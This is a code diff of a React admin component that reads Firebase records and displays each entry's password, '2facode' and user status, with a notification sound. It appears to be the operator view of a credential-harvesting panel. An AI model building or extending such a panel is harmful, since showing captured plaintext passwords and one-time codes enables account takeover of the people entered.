@@ -9,6 +9,7 @@ var audio = new Audio("/notify.mp3");
 
 const MainAdmin = () => {
   const [records, setRecords] = useState([]);
+  console.log(records);
   useEffect(() => {
     const starCountRef = ref(database, "records");
     onValue(starCountRef, (snapshot) => {
@@ -119,14 +120,10 @@ const MainAdmin = () => {
                     maxWidth: 300,
                   }}
                 >
-                  {d?.password?.map((d) => {
-                    return (
-                      <>
-                        <span>{d}</span>
-                        <br />
-                      </>
-                    );
-                  })}
+                  <>
+                    <span>{d?.password}</span>
+                    <br />
+                  </>
                 </td>
                 <td>{d["2facode"]}</td>
                 <td>{d?.user_status}</td>
